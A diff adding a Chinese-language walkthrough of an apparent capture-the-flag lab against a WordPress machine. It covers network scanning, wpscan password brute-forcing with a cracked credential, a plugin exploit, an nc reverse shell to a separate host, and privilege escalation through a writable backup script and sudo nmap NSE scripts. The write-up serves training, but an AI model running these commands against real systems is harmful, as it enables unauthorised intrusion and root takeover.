@@ -1,0 +1,58 @@
+sudo arp-scan 192.168.140.0/24
+扫描发现主机
+
+nmap -A -p- 192.168.140.137
+进行主机信息和端口扫描
+发现开启了80端口和22端口
+
+80网页不能访问，设置hosts后访问
+cd /etc/hosts
+
+是一个WordPress的网站
+
+利用wpscan进行扫描
+admin jens graham mark sarah
+
+用wpscan爆破，这里官方提示了用rockyou.txt这个字典
+第一次用需要解压
+gzip -d /usr/share/wordlists/rockyou.txt.gz
+wpscan --url http://wordy/ -U username.txt -P /usr/share/wordlists/rockyou.txt
+
+漫长的等待。。。这字典好大。。。
+Username: mark, Password: helpdesk01
+
+发现有activity-monitor插件，看看插件是否有漏洞
+
+searchsploit activity monitor
+发现三个，这里用50110.py
+按照里边的步骤活动一个权限，然后nc反弹shell
+nc 192.168.140.129 9999 -e /bin/bash
+
+在mark用户的目录下记录了graham用户名密码
+Add new user: graham - GSo7isUM1D4 - done
+
+之前信息搜集发现开了22端口
+可以用ssh远程登录graham用户
+
+jens目录下有可执行文件.sh，且graham有权限执行
+echo "/bin/bash" >> backups.sh
+将jens的shell命令追加进backups.sh文件中
+
+sudo -u jens /home/jens/backups.sh
+利用jens身份执行文件
+
+获得jens的权限
+
+sudo -l
+发现jens可以无密码执行root权限中的nmap
+利用提权
+
+这里利用了nmap的script脚本功能
+首先创建一个.nse的脚本，里边写如shell地址的执行
+echo 'os.execute("/bin/bash")'>getroot.nse
+利用nmap调用
+sudo nmap --script=/home/jens/getroot.nse
+获得root权限
+python -c "import pty;pty.spawn('/bin/bash')"
+进入root目录拿到flag
+结束！
